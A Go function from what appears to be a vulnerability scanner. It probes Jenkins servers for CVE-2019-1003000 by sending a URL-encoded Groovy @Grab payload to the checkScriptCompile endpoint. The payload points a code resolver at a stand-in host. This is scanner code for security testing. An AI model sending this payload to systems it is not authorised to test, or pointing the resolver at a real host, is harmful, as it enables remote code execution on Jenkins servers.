package jenkins

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

func CVE_2019_10003000(u string) bool {
	if req, err := http.Request(u, "GET", "", false, nil); err == nil {
		if req.Header.Get("X-Jenkins-Session") != "" {
			if req2, err := http.Request(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27vtest%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vtestvul%27,%20version=%271%27)%0aimport%20Vtest;", "GET", "", false, nil); err == nil {
				if strings.Contains(req2.Body, "package#vtestvul") {
					return true
				}
			}
		}
	}
	return false
}
